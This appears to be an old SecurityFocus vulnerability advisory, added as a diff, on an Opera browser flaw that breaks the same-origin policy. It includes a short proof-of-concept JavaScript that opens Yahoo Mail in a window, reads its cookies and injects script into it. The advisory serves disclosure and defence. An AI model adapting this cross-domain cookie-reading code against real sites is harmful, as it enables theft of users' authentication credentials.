@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/3553/info
+
+Opera is a popular, freely available web browser that is supported across many different platforms.
+
+Opera is prone to an issue which may allow for the execution of script code across domains, allowing for circumvention of the web browser's security model. It is possible to construct malicious script code on a webpage, which when executed by Opera web browser, is able to affect another domain.
+
+In short, Opera does not properly implement the "Same Origin Policy" enforced by other browsers.
+
+The danger is that one website may be able to access the cookie-based authentication credentials of another website. 
+
+-1.----------------------------------
+a=window.open("http://mail.yahoo.com");
+function f()
+{
+xx=a.document.cookie;
+alert("hi"+xx);
+a.document.open();
+a.document.write("<h1>aa</h1><script>x=window.open('http://mail.yahoo.com');setTimeout('z=x.document.cookie;alert(z);',5000)</"+"script>");
+a.document.close();
+}
+setTimeout("f()",5000);
+----------------------------------- 
